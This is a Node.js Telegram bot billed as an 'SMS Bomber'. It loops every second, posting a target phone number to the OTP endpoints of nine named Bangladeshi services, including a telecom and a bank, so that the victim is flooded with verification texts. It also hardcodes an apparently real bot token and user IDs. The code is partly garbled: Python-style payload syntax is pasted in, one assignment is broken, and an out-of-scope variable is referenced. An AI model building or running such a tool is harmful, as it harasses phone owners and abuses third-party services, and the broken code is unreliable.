const { Telegraf } = require('telegraf');
const axios = require('axios');
const express = require('express');

const app = express();
const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
  res.send("I'm ON");
});

const server = app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

const botToken = '6880465769:AAFdq32alIE7Z_iSlrbjGNDKhLyDxIwyPhg'; // Replace with your Telegram Bot token
const allowedUserIds = [1915576406, 6343969439]; // Replace with your authorized user IDs

const bot = new Telegraf(botToken);
let sendOtpFlag = false;
let loopCounter = 0;

bot.command('start', (ctx) => {
  ctx.reply("Welcome to the SMS Bomber bot! Please type /sendotp <phone_number> to continuously send OTPs.");
});

bot.command('sendotp', async (ctx) => {
  if (!allowedUserIds.includes(ctx.from.id)) {
    ctx.reply("You are not authorized to use this command.");
    return;
  }

  const args = ctx.message.text.split(' ').slice(1);

  if (args.length > 0) {
    const phoneNumber = args[0];
    sendOtpFlag = true;
    loopCounter = 0;

    const apiEndpoints = [
    "https://weblogin.grameenphone.com/backend/api/v1/otp",
    "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
    "https://fundesh.com.bd/api/auth/resendOTP",
    "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    "https://api.shikho.com/auth/v2/send/sms",
    "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
    "https://themallbd.com/api/auth/otp_login",
    "https://bikroy.com/data/phone_number_login/verifications/phone_login",
];
{
            "https://weblogin.grameenphone.com/backend/api/v1/otp": {"msisdn": phone_number},
    "https://developer.quizgiri.xyz/api/v2.0/send-otp": {"country_code": "+880", "phone": phone_number},
    "https://fundesh.com.bd/api/auth/generateOTP?service_key=": {"msisdn": phone_number},
    "https://fundesh.com.bd/api/auth/resendOTP": {"msisdn": phone_number},
    "https://developer.quizgiri.xyz/api/v2.0/send-otp": {"phone": phone_number, "country_code": "+880", "fcm_token": None},
    "https://api.shikho.com/auth/v2/send/sms": {"phone": phone_number, "email": None, "auth_type": "login"},
    "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber": {
        "AccessToken": "",
        "TrackingNo": "",
        "mobileNo": phone_number,
        "otpSms": "",
        "product_id": "201",
        "requestChannel": "MOB",
        "trackingStatus": 5
    },
    "https://themallbd.com/api/auth/otp_login": {"phone_number": "+880" + phone_number},
    "https://bikroy.com/data/phone_number_login/verifications/phone_login": {},
}
    const jsonPayloads = };

    const sendOtpJob = async () => {
      loopCounter++;

      for (const [index, endpoint] of apiEndpoints.entries()) {
        try {
          const response = await axios.post(endpoint, jsonPayloads[endpoint]);

          if (response.status === 200) {
            ctx.reply(`SMS sent to ${phoneNumber} successfully.`);
          } else {
            ctx.reply(`Sending failed for ${phoneNumber}.`);
          }
        } catch (e) {
          ctx.reply(`Error requesting OTP from ${apiEndpoints[index]}: ${e.message}`);
        }
      }

      if (args[1] && loopCounter >= parseInt(args[1])) {
        sendOtpFlag = false;
        clearInterval(sendOtpInterval);
        ctx.reply(`SMS OTP sending stopped after ${loopCounter} loops.`);
      }
    };

    const sendOtpInterval = setInterval(sendOtpJob, 1000);

  } else {
    ctx.reply("Please provide a phone number and, optionally, the number of loops. Example: /sendotp 1234567890 5");
  }
});

bot.command('stopotp', (ctx) => {
  sendOtpFlag = false;
  clearInterval(sendOtpInterval);
  ctx.reply("Continuous OTP sending stopped.");
});

bot.launch();
